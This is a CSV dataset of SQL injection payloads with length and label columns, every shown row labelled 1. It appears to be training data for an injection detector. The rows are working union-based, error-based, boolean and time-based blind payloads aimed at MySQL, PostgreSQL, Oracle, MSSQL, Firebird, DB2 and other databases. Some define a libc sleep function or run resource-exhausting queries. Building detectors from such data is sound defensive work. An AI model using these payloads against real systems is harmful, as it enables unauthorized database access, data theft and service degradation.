payload,length,label
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",84,1
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('gydh'='gydh",114,1
1%') order by 1#,16,1
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",132,1
"1"") union all select null,null,null,null,null#",46,1
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,225,1
-8359) where 4430=4430 or 6872=6872--,37,1
"1"") as lgxc where 1117=1117 union all select null,null,null,null,null,null,null,null#",85,1
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",49,1
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",124,1
1%')) and sleep(5)#,19,1
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",183,1
"1"")) as zemm where 3324=3324 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,1
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",133,1
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,1
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",102,1
"1')) as kdwc where 5906=5906 union all select null,null,null,null,null,null,null,null,null--",92,1
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",55,1
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",89,1
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,1
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('hbld'='hbld",124,1
"1"")) or (select * from (select(sleep(5)))sddo)#",47,1
"-8600"" or elt(1032=1032,3623) and ""kfsn"" like ""kfsn",51,1
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",120,1
1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--,66,1
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# urzg",146,1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",120,1
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,83,1
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",104,1
"-5052))) union all select 8351,8351,8351,8351#",46,1
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",79,1
"1 where 2751=2751 union all select null,null,null,null--",56,1
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",108,1
"1""));if(7899=7899) select 7899 else drop function zbbp--",56,1
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",169,1
"-6772"")) or 9323=9323#",22,1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",115,1
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""dnlz""=""dnlz",100,1
"1'))) union all select null,null,null,null,null,null,null,null,null#",68,1
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",73,1
"-4707' union all select 4414,4414,4414,4414,4414,4414#",54,1
"-3300' union all select 8979,8979,8979,8979,8979,8979--",55,1
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",110,1
"-2500'))) union all select 6853,6853,6853,6853--",48,1
"1) as vqdh where 1603=1603;iif(4436=8910,1,1/0)",47,1
"-8608"" or 5460=4461--",21,1
"1%"";begin dbms_lock.sleep(5); end--",35,1
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",58,1
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""ubvd""=""ubvd",64,1
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",100,1
"1%' or elt(6272=6272,sleep(5)) and '%'='",40,1
"elt(5953=5953,1)",16,1
"1""))) and elt(3114=3114,sleep(5))#",34,1
1%')) rlike (select (case when (6094=7893) then 1 else 0x28 end)) and (('%'=',77,1
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",113,1
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'aezm' like 'aezm",120,1
-8404)) order by 1--,20,1
"1"") and 2006=2006",17,1
-6079))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((8708=8708,227,1
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,214,1
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",102,1
"-7923"")) or make_set(9354=9354,7185) and ((""szct""=""szct",55,1
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('etzb'='etzb",140,1
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",101,1
"1',(case when 8260=8260 then 1 else null end)",45,1
1'))) and 8594=(select 8594 from pg_sleep(5))--,47,1
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",93,1
"1%"")) and 8635=(select count(*) from generate_series(1,5000000))--",66,1
"1"") and make_set(4539=6401,6401) and (""kglx""=""kglx",50,1
"-5859) as ernq where 8394=8394 union all select 8394,8394,8394--",64,1
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('holo'='holo",173,1
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,1
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",64,1
"1%"") or sleep(5) and (""%""=""",27,1
"1' or elt(6272=6272,sleep(5))",29,1
-6095') or 6872=6872 and ('bfwm' like 'bfwm,43,1
"1'||(select 'xhqy' where 4531=4531 union all select null,null--",63,1
-8465' where 5242=5242 or 3806=7423--,37,1
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",106,1
"1' where 9381=9381;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",102,1
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('kufi'='kufi",113,1
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",73,1
"1%') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('%'='",145,1
"1,(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",169,1
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,72,1
"1') and make_set(8403=8403,8899) and ('ojag'='ojag",50,1
"-2111' union all select 1061,1061,1061--",40,1
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp",67,1
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""kbex"" like ""kbex",129,1
"1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#",60,1
"1"") where 2215=2215 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",253,1
"1') and elt(4249=4249,7259) and ('bkag'='bkag",45,1
1));select (case when (9103=9836) then 9103 else cast(1 as int)/(select 0 from dual) end) from dual--,101,1
(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end)),93,1
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# dwxl",203,1
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,230,1
"1"")) as vhrq where 1690=1690 and elt(1210=1210,sleep(5))--",58,1
"-2704"") union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",71,1
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",78,1
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",110,1
"1%""));if(7899=7899) select 7899 else drop function zbbp--",57,1
-7346 or 8571=8571--,20,1
"-9630%"" union all select 8592,8592,8592,8592--",46,1
-5880')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rwgl'='rwgl,207,1
"-2007%')) union all select 7298,7298,7298#",42,1
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,1
1') where 3861=3861;select pg_sleep(5)--,40,1
"1"") order by 1#",15,1
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",235,1
"1) as zhvx where 3171=3171 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",158,1
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",96,1
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",118,1
"-7271'))) or make_set(9354=9354,7185) and ((('mdtw'='mdtw",57,1
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,1
"1""))) and 5429=9596",19,1
"1%') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('%'='",104,1
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",91,1
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,62,1
1 and 2006=2006,15,1
1') where 1424=1424 and sleep(5)--,34,1
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",95,1
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",65,1
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,60,1
"1"")) as ydkd where 2455=2455 and sleep(5)--",43,1
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'imqi'='imqi",80,1
"1)) as jfae where 6684=6684 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,1
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",160,1
"1"" where 5477=5477;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,1
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,1
"-4993"" union all select 6959,6959,6959--",40,1
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",78,1
"1"") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,1
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",97,1
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,1
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy",113,1
"-8966""))) or 1628=2712",22,1
"1%"")));begin user_lock.sleep(5); end--",38,1
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--",58,1
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,231,1
(select (case when (9856=9856) then sleep(5) else 9856*(select 9856 from information_schema.character_sets) end)),113,1
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",61,1
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",79,1
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""mmsh""=""mmsh",116,1
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",95,1
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,1
-3598) union all select 2264#,29,1
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",106,1
"1%""))) and 7758=4792 and (((""%""=""",33,1
"1%"") rlike sleep(5) and (""%""=""",30,1
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',252,1
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,201,1
"1%')) and elt(3114=3114,sleep(5))#",34,1
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",124,1
"1%""))) union all select null,null,null,null,null,null#",54,1
-3750'+(select alpu where 3911=3911 order by 1--,48,1
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",71,1
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,63,1
1');select case when 8975=2352 then 1 else null end--,53,1
"1' where 5060=5060;select count(*) from generate_series(1,5000000)--",68,1
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",118,1
1'||(select 'yhpe' where 8010=8010 rlike (select (case when (7910=3752) then 1 else 0x28 end)))||',98,1
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",212,1
"1"") where 8612=8612;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,1
"1"");select count(*) from generate_series(1,5000000)--",53,1
"1,(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,1
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,1
"1"" where 4082=4082 and elt(5699=1432,1432)--",44,1
"1%')) union all select null,null,null,null,null,null,null,null,null--",69,1
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--",62,1
"1))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((8018=8018",122,1
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",57,1
1%')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,104,1
"1"")) as vgsb where 4747=4747;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,1
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dbxi"" like ""dbxi",168,1
1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,252,1
1)) order by 1--,16,1
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",206,1
1%' rlike sleep(5)#,19,1
-5774' where 3632=3632 or (3177=4222)*4222--,44,1
"-1033 union all select 8731,8731,8731,8731,8731,8731--",54,1
"1))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,1
1);waitfor delay '0:0:5' and (4614=4614,39,1
"-1277"") where 6622=6622 or 3038=3038",36,1
"1')) as xuab where 4369=4369 union all select null,null,null--",62,1
